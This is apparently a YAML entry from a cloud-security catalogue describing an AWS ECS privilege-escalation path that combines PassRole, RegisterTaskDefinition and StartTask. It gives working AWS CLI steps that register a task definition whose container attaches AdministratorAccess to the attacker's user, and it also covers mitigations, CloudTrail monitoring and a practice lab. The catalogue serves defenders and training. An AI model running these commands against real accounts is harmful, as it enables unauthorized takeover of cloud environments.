id: ecs-005
name: iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask
category: new-passrole
services:
- iam
- ecs
description: A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:StartTask` can create a new ECS task definition and attach an existing privileged IAM role to it, then start the task on an existing EC2 container instance. By registering a task definition with a malicious container command and starting it on an EC2-based ECS cluster, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. Unlike `ecs:RunTask` which works with both EC2 and Fargate launch types, `ecs:StartTask` is specifically for EC2 launch types and requires specifying an existing container instance ARN. This is a classic "pass role to service" privilege escalation pattern where the combination of task definition registration, role passing, and task execution permissions creates an indirect path to elevated privileges. The level of access gained depends on the permissions of the available roles.
prerequisites:
  admin:
  - An ECS cluster must exist with at least one registered EC2 container instance
  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
  - An ECS cluster must exist with at least one registered EC2 container instance
  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
exploitationSteps:
  awscli:
  - step: 1
    command: aws sts get-caller-identity
    description: Get your AWS account ID to construct resource ARNs
  - step: 2
    command: aws ecs list-clusters
    description: Discover available ECS clusters in the account (optional but helpful for finding target cluster)
  - step: 3
    command: aws ecs list-container-instances --cluster CLUSTER_NAME
    description: Retrieve container instance ARNs needed for StartTask command (requires an EC2-based cluster with registered instances)
  - step: 4
    command: |
      aws ecs register-task-definition \
        --family privesc-task \
        --network-mode bridge \
        --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --container-definitions '[{
          "name": "privesc-container",
          "image": "amazonlinux:latest",
          "memory": 512,
          "essential": true,
          "command": [
            "/bin/sh",
            "-c",
            "aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo \"Successfully attached AdministratorAccess!\""
          ]
        }]'
    description: Register a task definition with the privileged role and malicious container command that attaches AdministratorAccess to your user (use bridge network mode for EC2 compatibility)
  - step: 5
    command: aws ecs start-task --cluster CLUSTER_NAME --task-definition privesc-task --container-instances CONTAINER_INSTANCE_ARN
    description: Start the task on a specific container instance to execute the container command with elevated privileges
  - step: 6
    command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
    description: Monitor the task status and wait for completion (status should change to RUNNING then STOPPED)
  - step: 7
    command: aws iam list-users --max-items 3
    description: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual ECS task definition registration followed by immediate task start
  - Monitor CloudTrail for ECS task start by principals who do not usually start tasks
  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
  - Monitor and alert on ECS task start with privileged roles
  - Regularly audit ECS tasks for excessive IAM permissions
  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access

discoveryAttribution:
  firstDocumented:
    source: HackTricks
    link: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc/
  derivativeOf:
    pathId: ecs-004
    modification: "Uses ecs:StartTask instead of ecs:RunTask to execute the malicious task definition on a specific container instance"
  ultimateOrigin:
    pathId: ecs-004
    author: Nick Spagnola
    organization: Rhino Security Labs
    date: 2020
    link: https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/
references:
- title: "AWS ECS Privilege Escalation - HackTricks"
  url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc/index.html#iampassrole-ecsregistertaskdefinition-ecsstarttask"
- title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers (Original Research)"
  url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
- title: "Auditing iam:PassRole: A Problematic Privilege Escalation Permission"
  url: "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
relatedPaths:
- ecs-001
- ecs-002
- ecs-003
- ecs-004
- ec2-001
- lambda-001
- codebuild-001
- cloudformation-001
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section and must trust ecs-tasks.amazonaws.com
  - permission: ecs:RegisterTaskDefinition
    resourceConstraints: Must have permission to register ECS task definitions
  - permission: ecs:StartTask
    resourceConstraints: Must have permission to start tasks on existing container instances
  additional:
  - permission: ecs:ListClusters
    resourceConstraints: Helpful for discovering available ECS clusters
  - permission: ecs:DescribeClusters
    resourceConstraints: Useful for viewing cluster details and configuration
  - permission: ecs:ListContainerInstances
    resourceConstraints: Required to retrieve container instance ARNs needed for StartTask
  - permission: ecs:DescribeContainerInstances
    resourceConstraints: Helpful for viewing container instance details and capacity
  - permission: ecs:DescribeTasks
    resourceConstraints: Useful for monitoring task execution status and verifying successful exploitation
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles that trust ECS tasks to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
learningEnvironments:
  pathfinding-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinding-labs
    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-registertaskdefinition+ecs-starttask"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:StartTask permissions. Can be an IAM user or role. This path requires an existing ECS cluster with EC2 container instances.
  - id: task_definition
    label: New ECS Task Definition
    type: resource
    description: |
      The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when launched on an EC2 container instance.
  - id: ecs_task
    label: New Running ECS Task
    type: resource
    description: |
      An ECS task running on an EC2 container instance, started via ecs:StartTask. Unlike RunTask, StartTask requires specifying the exact container instance ARN and only works with EC2 launch type (not Fargate).
  - id: target_role
    label: Existing Role That Trusts the ecs-tasks Service
    type: principal
    description: |
      The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs on the container instance.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions, the attacker gains full administrative access via the task's actions executing on the EC2 container instance.
  - id: partial_outcome
    label: Some additional access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation with possible access to sensitive resources.
  - id: minimal_outcome
    label: No additional access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.
  edges:
  - from: start
    to: task_definition
    label: iam:PassRole + ecs:RegisterTaskDefinition
    description: |
      The attacker registers a task definition that passes a privileged role. Uses bridge network mode for EC2 compatibility.

      Command:
      ```bash
      aws ecs register-task-definition \
        --family privesc-task \
        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
        --network-mode bridge \
        --container-definitions '[{"name":"exploit","image":"amazonlinux:latest","memory":512,"command":["/bin/sh","-c","aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]}]'
      ```
  - from: task_definition
    to: ecs_task
    label: ecs:StartTask
    description: |
      The attacker starts the task on a specific EC2 container instance. Unlike RunTask, StartTask requires specifying the container instance ARN.

      Command:
      ```bash
      aws ecs start-task \
        --cluster existing-cluster \
        --task-definition privesc-task \
        --container-instances arn:aws:ecs:region:account:container-instance/cluster-name/instance-id
      ```
  - from: ecs_task
    to: target_role
    label: Task assumes role and executes
    description: |
      The task automatically assumes the target role and executes the containerized commands on the EC2 instance with the role's permissions.
  - from: target_role
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.
  - from: target_role
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.
  - from: target_role
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role has minimal permissions, the task may not yield meaningful privilege escalation.
